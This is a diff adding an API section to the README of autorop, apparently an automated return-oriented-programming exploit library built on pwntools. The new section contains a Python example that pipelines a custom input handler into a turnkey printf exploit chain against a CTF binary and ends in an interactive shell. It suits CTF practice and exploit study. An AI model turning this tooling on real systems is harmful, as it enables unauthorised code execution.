@@ -35,3 +35,47 @@ Command line
     The address of function "puts" is 0xf7e2eda0
     $ wc -c /home/ctf/flag
     57 /home/ctf/flag
+
+
+API
+---
+
+Importing autorop automatically does a ``from pwn import *``, so you can use all of `pwntools' goodies <https://docs.pwntools.com/en/latest/>`.
+
+Central to autorop's design is the `pipeline <https://en.wikipedia.org/wiki/Pipeline_(software)>`. Most functions take in a ``PwnState``, mutate it, and pass it on to the next function. This allows great simplicity and flexibility.
+
+See how the below example neatly manages to "downgrade" the problem from something unique, to something generic that the ``classic_printf`` pipeline can handle.
+
+.. code-block:: python
+
+    from autorop import *
+
+    BIN = "./tests/tjctf_2020/stop"
+
+
+    def send_letter_first(t, data):
+        # the binary expects us to choose a letter first, before it takes input unsafely
+        t.sendline("A")
+        # avoid messing up output by cleaning it of whatever "A" did
+        t.clean(constants.CLEAN_TIME)
+        # send actual payload
+        t.sendline(data)
+        # clean output so generic output gets out of the way
+        t.recvuntil(b"Sorry, we don't have that category yet\n")
+
+
+    # in this case a function is overkill,
+    # but demonstrates the flexibility of custom pipelines
+    def set_overwriter(state):
+        state.overwriter = send_letter_first
+        return state
+
+
+    # create a starting state
+    s = PwnState(BIN, process(BIN))
+
+    # build a custom pipeline, connecting it to the classic_printf pipeline
+    result = pipeline(s, set_overwriter, turnkey.classic_printf)
+
+    # switch to interactive shell which we got via the exploit
+    result.target.interactive()
